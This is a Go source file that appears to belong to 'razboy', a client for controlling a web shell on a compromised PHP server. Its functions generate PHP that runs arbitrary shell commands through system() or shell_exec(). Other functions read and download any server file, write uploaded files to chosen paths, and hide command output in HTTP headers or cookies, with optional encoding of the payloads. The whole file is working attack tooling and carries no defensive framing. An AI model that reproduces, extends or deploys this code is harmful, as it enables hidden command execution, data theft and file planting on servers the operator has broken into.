package phpadapter

import (
	"bytes"
	"io"
	"mime/multipart"
	"os"
	"path/filepath"

	"github.com/eatbytes/razboy/core"
	"github.com/eatbytes/razboy/normalizer"
)

func _getSystemCMD(cmd, letter string) string {
	return "ob_start();system('" + cmd + "');$" + letter + "=ob_get_contents();ob_end_clean();"
}

func _getShellExecCMD(cmd, letter string) string {
	return "$" + letter + "=shell_exec('" + cmd + "');"
}

func CreateCMD(cmd string, shl *core.SHELLCONFIG) string {
	var contexter, shellCMD string

	if shl.Scope != "" {
		contexter = "cd " + shl.Scope + " && "
	}

	shellCMD = contexter + cmd

	if shl.Method == "" || shl.Method == "system" {
		shellCMD = _getSystemCMD(shellCMD, "r")
	} else if shl.Method == "shell_exec" {
		shellCMD = _getShellExecCMD(shellCMD, "r")
	}

	return shellCMD
}

func CreateDownload(dir string, php *core.PHPCONFIG) string {
	var ifstr, endifstr, headers, cmd string

	ifstr = "if (file_exists('" + dir + "')) {"
	endifstr = "}"
	headers = `header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Pragma: public');`
	headers = headers + "header('Content-Length: ' . filesize('" + dir + "'));" + "header('Content-Disposition: attachment; filename='.basename('" + dir + "'));"

	cmd = ifstr + headers + "ob_clean();flush();readfile('" + dir + "');exit();" + endifstr

	return cmd
}

func CreateUpload(path, dir string, php *core.PHPCONFIG) (string, error) {
	var (
		cmd    string
		err    error
		file   *os.File
		body   *bytes.Buffer
		writer *multipart.Writer
		part   io.Writer
	)

	cmd = "$file=$_FILES['file'];move_uploaded_file($file['tmp_name'], '" + dir + "');if(file_exists('" + dir + "')){echo 1;}"

	if !php.Raw {
		cmd = normalizer.Encode(cmd)
	}

	file, err = os.Open(path)

	if err != nil {
		return "", err
	}

	defer file.Close()

	body = &bytes.Buffer{}
	writer = multipart.NewWriter(body)
	part, err = writer.CreateFormFile("file", filepath.Base(path))

	if err != nil {
		return "", err
	}

	_, err = io.Copy(part, file)

	if err != nil {
		return "", err
	}

	err = writer.Close()

	if err != nil {
		return "", err
	}

	php.Buffer = body

	return cmd, nil
}

func CreateAnswer(r *core.REQUEST) string {
	if r.SRVc.Method == "HEADER" {
		return "header('" + r.SRVc.Parameter + ":' . " + normalizer.PHPEncode("$r") + ");exit();"
	}

	if r.SRVc.Method == "COOKIE" {
		return "setcookie('" + r.SRVc.Parameter + "', " + normalizer.PHPEncode("$r") + ");exit();"
	}

	return "echo(" + normalizer.PHPEncode("$r") + ");exit();"
}
